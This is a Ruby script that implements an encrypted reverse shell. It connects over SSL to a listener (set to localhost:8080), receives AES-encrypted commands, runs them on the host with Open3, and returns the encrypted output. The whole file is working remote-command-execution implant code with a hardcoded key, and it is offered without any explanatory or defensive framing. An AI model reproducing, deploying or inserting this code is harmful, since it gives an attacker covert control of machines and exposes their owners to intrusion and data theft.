#!/usr/bin/env ruby
require 'socket'
require 'openssl'
require 'base64'
require 'open3'
require 'shellwords'
def encrypt(command)
  @aes.encrypt
  @aes.key = @key
  #aes.iv = iv
  encrypted_data = @aes.update(command) + @aes.final
  encoded_command = Base64.strict_encode64(encrypted_data)
  return encoded_command
end
def decrypt(command)
  @aes.decrypt
  @aes.key = @key
  #aes.iv = iv
  base64_data = command
  decode_data = Base64.strict_decode64(base64_data)
  decrypt_data = @aes.update(decode_data) + @aes.final
  return decrypt_data
end
def command_loop(socket)
  loop {
    command = socket.gets
    decypt_command = decrypt(command.chomp)
    decypt_command = decypt_command.chomp
    exit if decypt_command == 'exit'
    shell_command, *arguments = Shellwords.shellsplit(decypt_command)
    if BUILTINS[shell_command]
      BUILTINS[shell_command].call(*arguments)
      socket.print("#{Dir.pwd}\n")
    else
      stdin, stdout_and_stderr = Open3.popen2e("#{decypt_command}")
      encrypted_command = encrypt(stdout_and_stderr.readlines.join.chomp)
      socket.print("#{encrypted_command}\n")
    end
  }
rescue => e
  encrypted_command = encrypt("#{e} command does not exist\n")
  @ssl_socket.puts(encrypted_command)
  command_loop(@ssl_socket)
end
def connect_to_host
  hostname = 'localhost'
  port = 8080
  socket = TCPSocket.new(hostname, port)
  ssl_context = OpenSSL::SSL::SSLContext.new()
  @ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
  @ssl_socket.sync_close = true
  @ssl_socket.connect
  command_loop(@ssl_socket)
end
begin
  BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
  @aes = OpenSSL::Cipher.new("AES-256-CFB")
  #rand_key = 32.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9',*'!'..')'].sample}.join
  @key = 'abcdefghijklmnopqrstuvwxyz123456'
  connect_to_host
end